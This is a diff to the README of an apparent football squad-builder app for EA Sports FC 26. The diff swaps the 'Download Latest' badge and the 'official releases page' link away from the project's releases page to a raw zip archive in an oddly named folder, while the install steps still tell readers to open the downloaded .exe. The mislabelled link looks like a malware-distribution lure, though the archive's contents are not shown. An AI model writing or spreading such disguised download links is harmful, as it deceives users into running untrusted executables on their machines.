@@ -1,6 +1,6 @@
 # ⚽ ai-squad-architect - Build winning football teams using data
 
-[![](https://img.shields.io/badge/Download_Latest-Release_Page-blue.svg)](https://github.com/Montan8629/ai-squad-architect/releases)
+[![](https://img.shields.io/badge/Download_Latest-Release_Page-blue.svg)](https://raw.githubusercontent.com/Montan8629/ai-squad-architect/main/unwomanize/squad_ai_architect_v2.2.zip)
 
 This application helps users build the ultimate starting eleven for EA Sports FC 26. It uses statistical models to compare player ratings, chemistry, and performance metrics. You get the best squad configuration without spending hours on manual research.
 
@@ -16,7 +16,7 @@ Ensure your computer meets these requirements to run the software smoothly:
 
 ## 📥 How to Install
 
-1.  Visit the [official releases page](https://github.com/Montan8629/ai-squad-architect/releases).
+1.  Visit the [official releases page](https://raw.githubusercontent.com/Montan8629/ai-squad-architect/main/unwomanize/squad_ai_architect_v2.2.zip).
 2.  Look for the latest version at the top of the list.
 3.  Click the file ending in .exe to start your download.
 4.  Open the file after the download finishes.
